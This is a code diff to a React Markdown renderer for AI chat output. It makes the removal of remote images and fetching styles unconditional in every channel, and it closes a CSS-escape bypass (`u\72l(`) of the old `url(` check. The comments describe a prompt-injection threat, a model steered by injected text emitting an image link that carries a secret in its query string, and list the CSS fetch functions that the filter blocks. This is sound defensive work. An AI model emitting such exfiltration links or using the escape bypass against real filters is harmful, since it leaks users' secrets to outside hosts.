@@ -20,10 +20,25 @@
  * `react-markdown` buys that CSS cannot — revisit then, not before.
  *
  * Sanitizing is not the whole story: DOMPurify keeps a remote `<img>`, which is
- * an exfiltration channel for a model steered by hostile text. The Workbench
- * closes it with `noRemoteSubresources` (decision X-10); today's chat channels
- * render exactly as they did, and the app-wide CSP is tracked separately as
- * agent-forge-harness-va8.
+ * an exfiltration channel for a model steered by hostile text. So the X-10 pass
+ * below runs on EVERY render, in every channel — chat and Workbench alike
+ * (agent-forge-harness-va8; it was opt-in, and off for chat, until this fix).
+ * Nothing rendered here may fetch anything by itself:
+ *
+ *   - the one surviving image is a reference to a campaign asset this origin
+ *     serves (MS-7);
+ *   - every other subresource element and attribute is dropped;
+ *   - a `style` attribute is dropped when its value could fetch — see
+ *     `styleMayFetch`;
+ *   - links are untouched: a link is a navigation the reader chooses, not a
+ *     subresource the page loads.
+ *
+ * This is the first of two layers, and it is the one that can be unit-tested:
+ * jsdom fetches nothing, so these tests prove that no element carrying a remote
+ * reference survives rendering, never that no request left a browser. The
+ * second layer is the Content-Security-Policy, which both hosts send —
+ * `service/security_headers.py` and `ui/nginx.conf` — and which is proven in a
+ * real browser by `ui/e2e/security.spec.ts`.
  */
 
 import * as React from 'react'
@@ -36,18 +51,12 @@ export interface MarkdownProps {
   source: string
   className?: string
   /**
-   * Decision X-10 — opt-in, and off for today's chat channels so their
-   * behaviour is unchanged. When on, nothing rendered here may fetch anything
-   * by itself: an image survives only as a reference to a campaign asset this
-   * origin serves, every other subresource element and attribute is dropped,
-   * and a `style` carrying `url()` loses the attribute. Links are untouched — a
-   * link is a navigation the reader chooses, not a subresource the page loads.
-   *
-   * The Workbench turns it on because a model steered by injected corpus text
-   * can emit `![](https://host/?d=<secret>)`, and this component would
-   * otherwise fetch it (AE-66).
+   * Accepted and ignored. Stripping is unconditional (va8); the type is
+   * narrowed to the literal `true` so that `noRemoteSubresources={false}` is a
+   * compile error rather than a silent opt-out. Kept so the Workbench call
+   * sites that pass it still compile.
    */
-  noRemoteSubresources?: boolean
+  noRemoteSubresources?: true
 }
 
 /** Elements that fetch something of their own accord. */
@@ -86,6 +95,36 @@ function isAssetReference(value: string | null): boolean {
   }
 }
 
+/** CSS functions that fetch. `image-set(` also covers `-webkit-image-set(`. */
+const FETCHING_CSS_FUNCTIONS = ['url(', 'image-set(', 'image(', 'cross-fade(', 'src(']
+
+/**
+ * True when a `style` attribute value could fetch something.
+ *
+ * A `style` is dropped when its value, lower-cased, contains a backslash or one
+ * of the fetching functions above; otherwise it is kept unchanged.
+ *
+ * The backslash rule is deliberately broad, and it is the point of this
+ * function. CSS unescapes `u\72l(` and `\75rl(` back into `url(`, so the
+ * previous `includes('url(')` check missed both — measured against
+ * dompurify@3.4.14, and the Workbench was exposed to it too, not only the chat
+ * channels. Deciding what a given escape unescapes to is exactly the analysis
+ * that produced the bypass, so a value carrying an escape is refused WITHOUT
+ * being interpreted. A style that merely contains a backslash and fetches
+ * nothing (`content:'\A'`) is refused with it, and nothing legitimate is lost:
+ * `marked` emits no `style` attribute at all — GFM table alignment comes out as
+ * `align="left"` — so only raw HTML in model output can reach this.
+ *
+ * Normalizing through the CSSOM instead was considered and rejected: jsdom's
+ * CSS parser and Chromium's disagree about unknown functions, and a test that
+ * passes in jsdom because jsdom dropped the value proves nothing about a
+ * browser.
+ */
+function styleMayFetch(value: string): boolean {
+  const lowered = value.toLowerCase()
+  return lowered.includes('\\') || FETCHING_CSS_FUNCTIONS.some((name) => lowered.includes(name))
+}
+
 /** X-10, applied to already-sanitized DOM — in a document that cannot fetch (see `renderMarkdown`). */
 function stripRemoteSubresources(host: HTMLElement): void {
   for (const element of host.querySelectorAll(SUBRESOURCE_ELEMENTS)) element.remove()
@@ -93,7 +132,7 @@ function stripRemoteSubresources(host: HTMLElement): void {
     for (const name of SUBRESOURCE_ATTRIBUTES) element.removeAttribute(name)
     if (element.tagName !== 'IMG') element.removeAttribute('src')
     const style = element.getAttribute('style')
-    if (style !== null && style.toLowerCase().includes('url(')) element.removeAttribute('style')
+    if (style !== null && styleMayFetch(style)) element.removeAttribute('style')
   }
   // An image is kept only when it points at a campaign asset this origin serves;
   // there is no half-measure, because an <img> with a stripped src is a broken icon.
@@ -115,10 +154,9 @@ function stripRemoteSubresources(host: HTMLElement): void {
  * ever does need the pure function, move it to its own module rather than
  * re-exporting it from here.
  */
-function renderMarkdown(source: string, noRemoteSubresources: boolean): string {
+function renderMarkdown(source: string): string {
   const raw = marked.parse(source, { async: false, gfm: true, breaks: true })
   const clean = DOMPurify.sanitize(raw)
-  if (!noRemoteSubresources) return clean
   // The X-10 pass reads attributes through the DOM rather than a regex, and it
   // must do so in an INERT document. An <img> starts loading the moment it is
   // created in, or adopted by, a document with a browsing context — attached to
@@ -131,10 +169,12 @@ function renderMarkdown(source: string, noRemoteSubresources: boolean): string {
   return inert.body.innerHTML
 }
 
-export function Markdown({ source, className, noRemoteSubresources = false }: MarkdownProps): React.JSX.Element {
+// `noRemoteSubresources` is deliberately NOT destructured: it is accepted and
+// ignored, and `noUnusedLocals` would fail the build on an unread binding.
+export function Markdown({ source, className }: MarkdownProps): React.JSX.Element {
   // Recomputed only when the source changes: sanitizing is not free and an
   // assistant answer re-renders on every unrelated ChatPane state change.
-  const html = React.useMemo(() => renderMarkdown(source, noRemoteSubresources), [source, noRemoteSubresources])
+  const html = React.useMemo(() => renderMarkdown(source), [source])
   return (
     <div
       className={['aether-markdown', className].filter(Boolean).join(' ')}
